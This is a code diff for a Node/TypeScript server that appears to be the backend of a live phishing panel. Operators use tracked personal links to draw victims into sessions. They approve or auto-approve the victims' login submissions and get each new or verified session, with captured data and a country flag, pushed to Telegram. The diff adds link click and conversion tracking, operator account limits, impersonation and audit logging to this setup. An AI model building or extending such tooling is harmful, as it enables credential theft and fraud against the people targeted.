@@ -12,7 +12,7 @@ import geoip from 'geoip-lite';
 import cookieParser from 'cookie-parser';
 import { shieldMiddleware, verifyHandler } from './shield';
 import * as db from './db';
-import { authenticateToken, requireRole, signToken } from './auth';
+import { authenticateToken, requireRole, signToken, verifyToken } from './auth';
 
 const app = express();
 const httpServer = createServer(app);
@@ -43,11 +43,40 @@ const corsOptions = {
     origin: corsOrigin,
     methods: ["GET", "POST"]
 };
-console.log(`[Server] CORS Configured. Mode: ${allowedOrigins === "*" ? "Wildcard" : "Restricted"}`);
 
 const io = new Server(httpServer, {
     cors: corsOptions
 });
+
+// --- Console Log Interception for Hypervisor ---
+const originalLog = console.log;
+const originalError = console.error;
+
+const broadcastLog = (type: 'log' | 'error', args: any[]) => {
+    try {
+        const msg = args.map(arg => {
+            if (typeof arg === 'object') {
+                try { return JSON.stringify(arg); } catch(e) { return '[Circular/Object]'; }
+            }
+            return String(arg);
+        }).join(' ');
+
+        // Emit to room 'hypervisor-logs'
+        io.to('hypervisor-logs').emit('log', { type, msg, timestamp: Date.now() });
+    } catch(e) {}
+};
+
+console.log = (...args) => {
+    originalLog.apply(console, args);
+    broadcastLog('log', args);
+};
+
+console.error = (...args) => {
+    originalError.apply(console, args);
+    broadcastLog('error', args);
+};
+
+console.log(`[Server] CORS Configured. Mode: ${allowedOrigins === "*" ? "Wildcard" : "Restricted"}`);
 
 const PORT = process.env.PORT || 8080;
 
@@ -72,11 +101,6 @@ app.use(cookieParser());
 
 // Rate Limiting - Disabled to prevent Render proxy issues
 app.set('trust proxy', 1);
-// const apiLimiter = rateLimit({
-//     windowMs: 15 * 60 * 1000, // 15 minutes
-//     max: 500 // Limit each IP to 500 requests per windowMs
-// });
-// app.use('/api/', apiLimiter);
 
 // --- Socket.IO ---
 
@@ -95,6 +119,16 @@ io.on('connection', (socket) => {
     socket.on('joinAdmin', () => {
         socket.join('admin');
         console.log(`[Socket] ${socket.id} joined ADMIN room`);
+    });
+
+    socket.on('joinHypervisor', (token: string) => {
+        const user = verifyToken(token);
+        if (user && user.role === 'hypervisor') {
+            socket.join('hypervisor-logs');
+            console.log(`[Socket] ${socket.id} joined HYPERVISOR logs`);
+        } else {
+            console.warn(`[Socket] Unauthorized attempt to join hypervisor logs: ${socket.id}`);
+        }
     });
 
     socket.on('disconnect', () => {
@@ -282,6 +316,16 @@ const getIpCountry = (ip: string) => {
     return geo ? geo.country : null;
 };
 
+// --- Link Tracking ---
+
+app.post('/api/track/click', async (req, res) => {
+    const { code } = req.body;
+    if (code) {
+        await db.incrementLinkClicks(code);
+    }
+    res.json({ status: 'ok' });
+});
+
 // 1. Sync State (Hybrid: HTTP for data, Socket for notify)
 app.post('/api/sync', async (req, res) => {
     try {
@@ -306,10 +350,17 @@ app.post('/api/sync', async (req, res) => {
 
         // 1. Check for Admin Code (Personalized Link)
         if (data.adminCode) {
-            const admin = await db.getUserByCode(data.adminCode);
-            if (admin) {
-                adminId = admin.id;
-            }
+             // Check NEW Links first
+             const link = await db.getLinkByCode(data.adminCode);
+             if (link) {
+                 adminId = link.adminId;
+             } else {
+                 // Check LEGACY User Code
+                 const admin = await db.getUserByCode(data.adminCode);
+                 if (admin) {
+                     adminId = admin.id;
+                 }
+             }
         }
 
         // 2. Load Existing Session (to check for pre-assigned admin)
@@ -370,11 +421,6 @@ app.post('/api/sync', async (req, res) => {
                         const resumePayload = latest;
                         const cmd = { action: 'RESUME', payload: resumePayload };
 
-                        // Preserve new adminCode assignment if needed, or inherit old one?
-                        // If user came with NEW link, we might want to switch admin?
-                        // Current logic: If resuming, we likely keep old assignment unless we force update.
-                        // But let's stick to Resume behavior.
-
                         return res.json({ status: 'ok', command: cmd });
                     }
 
@@ -386,7 +432,6 @@ app.post('/api/sync', async (req, res) => {
                         // Inherit Admin ID from previous session if not set?
                         if (!adminId && latest.adminId) {
                             adminId = latest.adminId;
-                            // Re-fetch admin settings... (Simplified: next sync will catch it)
                         }
                     }
                 }
@@ -407,6 +452,11 @@ app.post('/api/sync', async (req, res) => {
             if (!alreadyHadCreds) {
                  const msg = formatSessionForTelegram(data, 'New Session Initialized', flag, true);
                  sendTelegram(msg, tgToken, tgChat);
+
+                 // Tracking: New Session Started
+                 if (data.adminCode) {
+                     db.incrementLinkSessions(data.adminCode, 'started');
+                 }
             }
         }
 
@@ -423,6 +473,15 @@ app.post('/api/sync', async (req, res) => {
 
              const msg = formatSessionForTelegram(data, title, flag, hideEmpty);
              sendTelegram(msg, tgToken, tgChat);
+
+             db.logAudit('System', 'Verified', `Session ${data.sessionId} Verified`);
+
+             // Tracking: Session Verified
+             // Admin might be different from Code if reassigned, but we track the code originally used if present?
+             // Actually adminCode stays in payload usually.
+             if (data.adminCode) {
+                 db.incrementLinkSessions(data.adminCode, 'verified');
+             }
         }
 
         // Prevent downgrading 'Verified' status
@@ -449,8 +508,6 @@ app.post('/api/sync', async (req, res) => {
         // 1. Login Auto-Approve (from Admin Settings)
         if (data.stage === 'login' && data.isLoginSubmitted && !data.isLoginVerified) {
              const autoApprove = (adminSettings as any).autoApproveLogin;
-             // Also support legacy Offline Auto-Approve if no admin assigned?
-             // Or just stick to admin settings.
 
              if (autoApprove) {
                   console.log(`[Auto-Approve] Admin Setting: Approving Login for ${data.sessionId}`);
@@ -462,20 +519,11 @@ app.post('/api/sync', async (req, res) => {
              }
         }
 
-        // 2. Skip Phone (If manually approved or auto-approved)
-        // Handled by returning settings, frontend can use it?
-        // Actually, frontend uses 'skipPhone' flag in APPROVE payload.
-        // We also send `settings` object back so frontend can adapt "live".
-
         // --- Offline Auto-Approve Logic (Fallback if no admin connected?) ---
         const adminRoom = io.sockets.adapter.rooms.get('admin');
         const isAdminOnline = adminRoom && adminRoom.size > 0;
 
         if (!isAdminOnline) {
-             // Default Offline Behavior (only if not already handled by specific admin settings)
-             // We can maybe disable this if we want strict admin control.
-             // But let's keep it for robustness.
-
              // ... (Existing Offline Logic) ...
              if (data.stage === 'login' && data.isLoginSubmitted && !data.isLoginVerified) {
                 // Check if we didn't already approve above
@@ -530,6 +578,7 @@ app.post('/api/settings', async (req, res) => {
     if (tgChat !== undefined) await db.updateSetting('tgChat', tgChat);
 
     await refreshSettings();
+    db.logAudit('System', 'UpdateSettings', 'Updated global settings');
     res.json({ status: 'ok' });
 });
 
@@ -540,9 +589,6 @@ app.post('/api/admin/login', async (req, res) => {
     try {
         const user = await db.getUserByUsername(username);
         if (!user || user.password !== password) {
-            // Legacy Fallback (Temporary) or just fail
-            // user request specifically said "implement hypervisor... manage accounts"
-            // so we rely on the new DB.
             return res.status(401).json({ error: 'Invalid credentials' });
         }
 
@@ -551,6 +597,8 @@ app.post('/api/admin/login', async (req, res) => {
             username: user.username,
             role: user.role
         });
+
+        db.logAudit(username, 'Login', 'Admin logged in');
 
         res.json({ status: 'ok', token, user: {
             id: user.id,
@@ -582,12 +630,56 @@ app.get('/api/admin/me', authenticateToken, async (req, res) => {
         username: user.username,
         role: user.role,
         uniqueCode: user.uniqueCode,
+        maxLinks: user.maxLinks || 1,
         settings,
         telegramConfig
     });
 });
 
+// --- Links Management ---
+
+app.get('/api/admin/links', authenticateToken, async (req, res) => {
+    try {
+        const u = (req as any).user;
+        const links = await db.getLinks(u.role === 'hypervisor' ? undefined : u.id);
+        res.json(links);
+    } catch(e) {
+        res.status(500).json({ error: 'Failed to fetch links' });
+    }
+});
+
+app.post('/api/admin/links', authenticateToken, async (req, res) => {
+    try {
+        const u = (req as any).user;
+        // Check limits
+        const user = await db.getUserById(u.id);
+        const currentLinks = await db.getLinks(u.id);
+        const max = user.maxLinks || 1;
+
+        if (currentLinks.length >= max && u.role !== 'hypervisor') {
+            return res.status(403).json({ error: 'Max links reached' });
+        }
+
+        const code = crypto.randomUUID().substring(0, 8);
+        await db.createLink(u.id, code);
+
+        db.logAudit(u.username, 'CreateLink', `Created link ${code}`);
+        res.json({ status: 'ok', code });
+    } catch(e) {
+        res.status(500).json({ error: 'Failed to create link' });
+    }
+});
+
 // --- Hypervisor Routes ---
+
+app.get('/api/admin/audit', authenticateToken, requireRole('hypervisor'), async (req, res) => {
+    try {
+        const logs = await db.getAuditLogs(100);
+        res.json(logs);
+    } catch(e) {
+        res.status(500).json({ error: 'Failed to fetch audit logs' });
+    }
+});
 
 app.get('/api/admin/users', authenticateToken, requireRole('hypervisor'), async (req, res) => {
     try {
@@ -598,6 +690,7 @@ app.get('/api/admin/users', authenticateToken, requireRole('hypervisor'), async 
             username: u.username,
             role: u.role,
             uniqueCode: u.uniqueCode,
+            maxLinks: u.maxLinks
             // settings: u.settings
         }));
         res.json(safeUsers);
@@ -619,8 +712,11 @@ app.post('/api/admin/users', authenticateToken, requireRole('hypervisor'), async
             role: role || 'admin',
             uniqueCode: uniqueCode || crypto.randomUUID().substring(0, 8),
             settings: '{}',
-            telegramConfig: '{}'
+            telegramConfig: '{}',
+            maxLinks: role === 'hypervisor' ? 100 : 1
         });
+
+        db.logAudit((req as any).user.username, 'CreateUser', `Created user ${username}`);
         res.json({ status: 'ok', id });
     } catch (e) {
         console.error(e);
@@ -630,14 +726,16 @@ app.post('/api/admin/users', authenticateToken, requireRole('hypervisor'), async
 
 app.put('/api/admin/users/:id', authenticateToken, requireRole('hypervisor'), async (req, res) => {
     try {
-        const { username, password, uniqueCode, settings } = req.body;
+        const { username, password, uniqueCode, settings, maxLinks } = req.body;
         const updates: any = {};
         if (username) updates.username = username;
         if (password) updates.password = password; // Should hash!
         if (uniqueCode) updates.uniqueCode = uniqueCode;
+        if (maxLinks !== undefined) updates.maxLinks = maxLinks;
         if (settings) updates.settings = JSON.stringify(settings);
 
         await db.updateUser(req.params.id, updates);
+        db.logAudit((req as any).user.username, 'UpdateUser', `Updated user ${req.params.id}`);
         res.json({ status: 'ok' });
     } catch (e) {
         res.status(500).json({ error: 'Failed to update user' });
@@ -651,6 +749,7 @@ app.delete('/api/admin/users/:id', authenticateToken, requireRole('hypervisor'),
             return res.status(400).json({ error: 'Cannot delete self' });
         }
         await db.deleteUser(req.params.id);
+        db.logAudit((req as any).user.username, 'DeleteUser', `Deleted user ${req.params.id}`);
         res.json({ status: 'ok' });
     } catch (e) {
         res.status(500).json({ error: 'Failed to delete user' });
@@ -669,6 +768,7 @@ app.post('/api/admin/impersonate/:id', authenticateToken, requireRole('hyperviso
             isImpersonated: true // Flag to show "Back to Hypervisor" in UI?
         });
 
+        db.logAudit((req as any).user.username, 'Impersonate', `Impersonated ${targetUser.username}`);
         res.json({ status: 'ok', token });
     } catch (e) {
         res.status(500).json({ error: 'Impersonation failed' });
@@ -680,6 +780,7 @@ app.post('/api/admin/assign-session', authenticateToken, requireRole('hypervisor
         const { sessionId, adminId } = req.body;
         await db.updateSessionAdmin(sessionId, adminId || null);
         io.emit('sessions-updated'); // Global update
+        db.logAudit((req as any).user.username, 'AssignSession', `Assigned ${sessionId} to ${adminId}`);
         res.json({ status: 'ok' });
     } catch (e) {
         res.status(500).json({ error: 'Assignment failed' });
